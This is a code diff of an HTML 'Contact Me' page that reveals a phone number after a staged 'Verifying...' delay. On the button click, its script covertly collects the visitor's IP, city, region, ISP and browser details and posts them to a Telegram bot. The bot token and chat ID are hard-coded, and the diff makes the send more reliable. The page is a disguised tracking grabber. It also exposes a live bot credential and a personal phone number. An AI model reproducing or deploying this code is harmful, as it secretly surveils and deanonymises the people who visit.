@@ -1,139 +1,173 @@
-<!DOCTYPE html>  <html>  
-<head>  
-<meta name="viewport" content="width=device-width, initial-scale=1.0">  
-<title>Get my number</title>  <style>  
-body {  
-  margin: 0;  
-  font-family: 'Segoe UI', sans-serif;  
-  height: 100vh;  
-  display: flex;  
-  justify-content: center;  
-  align-items: center;  
-  background: linear-gradient(135deg, #667eea, #764ba2);  
-}  
-  
-/* Glass Card */  
-.container {  
-  background: rgba(255,255,255,0.15);  
-  backdrop-filter: blur(15px);  
-  padding: 25px;  
-  border-radius: 20px;  
-  width: 90%;  
-  max-width: 380px;  
-  text-align: center;  
-  color: white;  
-  box-shadow: 0 10px 30px rgba(0,0,0,0.2);  
-}  
-  
-/* Title */  
-h2 {  
-  margin-bottom: 20px;  
-}  
-  
-/* ALL BUTTONS SAME SIZE */  
-button, a {  
-  display: block;  
-  width: 100%;  
-  padding: 15px;  
-  margin-top: 12px;  
-  border-radius: 12px;  
-  font-size: 16px;  
-  text-align: center;  
-  box-sizing: border-box;  
-  text-decoration: none;  
-  border: none;  
-  transition: 0.2s;  
-}  
-  
-/* Main button */  
-button {  
-  background: white;  
-  color: #333;  
-  font-weight: bold;  
-}  
-  
-button:active {  
-  transform: scale(0.96);  
-}  
-  
-/* WhatsApp */  
-#wa {  
-  background: #25D366;  
-  color: white;  
-}  
-  
-/* Call */  
-#call {  
-  background: #28a745;  
-  color: white;  
-}  
-  
-/* Number */  
-#num {  
-  font-size: 22px;  
-  margin-top: 15px;  
-  font-weight: bold;  
-}  
-  
-/* Loading */  
-#loading {  
-  display: none;  
-  margin-top: 15px;  
-  font-size: 14px;  
-  opacity: 0.8;  
-}  
-</style>  </head>  <body>  <div class="container">  <h2>Contact Me</h2>  <button onclick="reveal()">Tap to Reveal Number</button>
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get my number</title>
 
-<p id="loading">🔍 Verifying...</p>  <p id="num" style="display:none;">  
-  +91 9510389983  
-</p>  <a id="wa" target="_blank" style="display:none;">  
-  💬 Chat on WhatsApp  
-</a>  <a id="call" target="_self" style="display:none;">  
-  📞 Call Now  
-</a>  </div>  <script>  
-async function reveal() {  
-  
-  document.getElementById("loading").style.display = "block";  
-  
-  await new Promise(r => setTimeout(r, 1200));  
-  
-  try {  
-    let data = await fetch("https://ipapi.co/json/")  
-      .then(res => res.json());  
-  
-    let message =  
-`📱 New Visitor!  
-  
-IP: ${data.ip}  
-City: ${data.city}  
-Region: ${data.region}  
-Country: ${data.country_name}  
-ISP: ${data.org}  
-Device: ${navigator.userAgent}  
-Time: ${new Date().toLocaleString()}`;  
-  
-    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {  
-      method: "POST",  
-      headers: {"Content-Type": "application/json"},  
-      body: JSON.stringify({  
-        chat_id: "6319233453",  
-        text: message  
-      })  
-    });  
-  
-  } catch(e) {}  
-  
-  document.getElementById("loading").style.display = "none";  
-  
-  document.getElementById("num").style.display = "block";  
-  
-  document.getElementById("wa").href =  
-    "https://wa.me/919510389983";  
-  document.getElementById("wa").style.display = "block";  
-  
-  document.getElementById("call").href =  
-    "tel:9510389983";  
-  document.getElementById("call").style.display = "block";  
-}  
-</script>  </body>  
+<style>
+body {
+  margin: 0;
+  font-family: 'Segoe UI', sans-serif;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(135deg, #667eea, #764ba2);
+}
+
+/* Glass Card */
+.container {
+  background: rgba(255,255,255,0.15);
+  backdrop-filter: blur(15px);
+  padding: 25px;
+  border-radius: 20px;
+  width: 90%;
+  max-width: 380px;
+  text-align: center;
+  color: white;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+}
+
+/* Title */
+h2 {
+  margin-bottom: 20px;
+}
+
+/* ALL BUTTONS SAME SIZE */
+button, a {
+  display: block;
+  width: 100%;
+  padding: 15px;
+  margin-top: 12px;
+  border-radius: 12px;
+  font-size: 16px;
+  text-align: center;
+  box-sizing: border-box;
+  text-decoration: none;
+  border: none;
+  transition: 0.2s;
+}
+
+/* Main button */
+button {
+  background: white;
+  color: #333;
+  font-weight: bold;
+}
+
+button:active {
+  transform: scale(0.96);
+}
+
+/* WhatsApp */
+#wa {
+  background: #25D366;
+  color: white;
+}
+
+/* Call */
+#call {
+  background: #28a745;
+  color: white;
+}
+
+/* Number */
+#num {
+  font-size: 22px;
+  margin-top: 15px;
+  font-weight: bold;
+}
+
+/* Loading */
+#loading {
+  display: none;
+  margin-top: 15px;
+  font-size: 14px;
+  opacity: 0.8;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h2>Contact Me</h2>
+
+  <button onclick="reveal()">Tap to Reveal Number</button>
+
+  <p id="loading">🔍 Verifying...</p>
+
+  <p id="num" style="display:none;">
+    +91 9510389983
+  </p>
+
+  <a id="wa" target="_blank" style="display:none;">
+    💬 Chat on WhatsApp
+  </a>
+
+  <a id="call" target="_self" style="display:none;">
+    📞 Call Now
+  </a>
+</div>
+
+<script>
+async function reveal() {
+
+  document.getElementById("loading").style.display = "block";
+
+  await new Promise(r => setTimeout(r, 1200));
+
+  try {
+
+    // Safer IP fetch
+    let data = {};
+    try {
+      let res = await fetch("https://ipapi.co/json/");
+      data = await res.json();
+    } catch {
+      data = { ip: "Unknown" };
+    }
+
+    let message = `📱 New Visitor!
+
+IP: ${data.ip || "Unknown"}
+City: ${data.city || "Unknown"}
+Region: ${data.region || "Unknown"}
+Country: ${data.country_name || "Unknown"}
+ISP: ${data.org || "Unknown"}
+Device: ${navigator.userAgent}
+Time: ${new Date().toLocaleString()}`;
+
+    // IMPORTANT: await added + response check
+    let tg = await fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: "6319233453",
+        text: message
+      })
+    });
+
+    let result = await tg.json();
+    console.log("Telegram Response:", result);
+
+  } catch(e) {
+    console.log("Error:", e);
+  }
+
+  document.getElementById("loading").style.display = "none";
+
+  document.getElementById("num").style.display = "block";
+
+  document.getElementById("wa").href = "https://wa.me/919510389983";
+  document.getElementById("wa").style.display = "block";
+
+  document.getElementById("call").href = "tel:9510389983";
+  document.getElementById("call").style.display = "block";
+}
+</script>
+
+</body>
 </html>
